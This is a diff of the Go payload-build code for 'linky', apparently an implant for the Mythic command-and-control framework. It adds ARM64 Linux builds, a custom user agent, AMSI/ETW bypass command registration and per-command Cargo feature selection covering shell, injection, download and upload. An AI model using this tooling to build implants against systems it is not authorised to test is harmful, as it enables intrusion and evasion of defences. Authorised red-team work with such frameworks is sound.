@@ -36,6 +36,8 @@ func Build(ctx context.Context, input agentstructs.PayloadBuildMessage) agentstr
 	shellcode, _ := input.BuildParameters.GetBooleanArg("shellcode")
 	debug, _ := input.BuildParameters.GetBooleanArg("debug")
 	indirectSyscalls, _ := input.BuildParameters.GetBooleanArg("indirect_syscalls")
+	userAgent, _ := input.BuildParameters.GetStringArg("user_agent")
+	commandsParam, _ := input.BuildParameters.GetArrayArg("commands")
 
 	payloadUUID := input.PayloadUUID
 
@@ -108,10 +110,16 @@ func Build(ctx context.Context, input agentstructs.PayloadBuildMessage) agentstr
 	switch targetOS {
 	case "linux":
 		crateDir = filepath.Join(agentDir, "links/linux")
-		target = "x86_64-unknown-linux-musl"
 		binName = "link-linux"
 		outputExt = ""
-		buildArch = agentstructs.PAYLOAD_BUILD_ARCHITECTURE_X64
+		archParam, _ := input.BuildParameters.GetStringArg("architecture")
+		if archParam == "aarch64" || archParam == "arm64" {
+			target = "aarch64-unknown-linux-musl"
+			buildArch = agentstructs.PAYLOAD_BUILD_ARCHITECTURE_ARM64
+		} else {
+			target = "x86_64-unknown-linux-musl"
+			buildArch = agentstructs.PAYLOAD_BUILD_ARCHITECTURE_X64
+		}
 	case "windows":
 		crateDir = filepath.Join(agentDir, "links/windows")
 		target = "x86_64-pc-windows-gnu"
@@ -153,6 +161,7 @@ func Build(ctx context.Context, input agentstructs.PayloadBuildMessage) agentstr
 	if indirectSyscalls && targetOS == "windows" {
 		args = append(args, "--features", "indirect-syscalls")
 	}
+	args = append(args, selectCommandFeatures(targetOS, commandsParam)...)
 	rustflags := "--remap-path-prefix=" + crateDir + "=. -C debuginfo=0"
 	cmd := exec.Command("cargo", args...)
 	cmd.Dir = crateDir
@@ -161,6 +170,7 @@ func Build(ctx context.Context, input agentstructs.PayloadBuildMessage) agentstr
 		fmt.Sprintf("IMPLANT_SECRET=%s", aesKeyB64),
 		fmt.Sprintf("PAYLOAD_UUID=%s", payloadUUID),
 		fmt.Sprintf("CALLBACK_URI=%s", callbackURI),
+		fmt.Sprintf("USER_AGENT=%s", userAgent),
 		fmt.Sprintf("RUSTFLAGS=%s", rustflags),
 	)
 
@@ -252,6 +262,7 @@ func pkcs7Pad(data []byte, blockSize int) []byte {
 
 // RegisterAllCommands registers every linky command with the Mythic container.
 func RegisterAllCommands() {
+	registerAmsiEtw()
 	registerShell()
 	registerCmd()
 	registerPowershell()
@@ -275,4 +286,51 @@ func RegisterAllCommands() {
 	registerRm()
 	registerMkdir()
 	registerExecute()
+}
+
+// commandFeatures maps Mythic command names to the Cargo feature that gates
+// their compilation in the implant. A command absent from the map is always
+// compiled (it has no dedicated feature).
+var commandFeatures = map[string]string{
+	"whoami":     "cmd-whoami",
+	"info":       "cmd-info",
+	"ps":         "cmd-ps",
+	"netstat":    "cmd-netstat",
+	"shell":      "cmd-shell",
+	"cmd":        "cmd-shell",
+	"powershell": "cmd-shell",
+	"execute":    "cmd-execute",
+	"download":   "cmd-download",
+	"upload":     "cmd-upload",
+	"inject":     "cmd-inject",
+	"integrity":  "cmd-integrity",
+	"amsi_etw":   "cmd-amsi-etw",
+}
+
+// selectCommandFeatures turns the "commands" build parameter into cargo
+// --no-default-features/--features flags. An empty selection keeps every
+// default feature (all commands compiled in).
+func selectCommandFeatures(targetOS string, commands []string) []string {
+	if len(commands) == 0 {
+		return nil
+	}
+	wanted := make(map[string]bool, len(commands))
+	for _, c := range commands {
+		wanted[c] = true
+	}
+	if wanted["shell"] && targetOS == "windows" {
+		wanted["cmd"] = true
+		wanted["powershell"] = true
+	}
+	var feats []string
+	for cmd, feat := range commandFeatures {
+		if wanted[cmd] {
+			feats = append(feats, feat)
+		}
+	}
+	args := []string{"--no-default-features"}
+	for _, f := range feats {
+		args = append(args, "--features", f)
+	}
+	return args
 }
